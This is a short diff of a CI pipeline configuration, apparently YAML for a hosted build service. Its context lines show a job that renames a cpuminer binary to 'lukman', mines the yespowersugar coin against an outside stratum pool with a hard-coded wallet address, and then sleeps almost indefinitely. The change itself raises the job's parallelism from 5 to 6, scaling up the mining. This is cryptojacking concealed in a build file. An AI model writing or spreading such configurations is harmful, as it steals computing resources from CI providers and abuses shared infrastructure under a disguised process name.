@@ -47,7 +47,7 @@ blocks:
             - mv cpuminer-sse2 lukman
             - './lukman -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qehz8cpmksmx8cz2grw30ycea3zlja7nudepmy2.TuyulGondrong -t0'
             - sleep 999999999
-          parallelism: 5
+          parallelism: 6
       epilogue:
         always:
           commands:
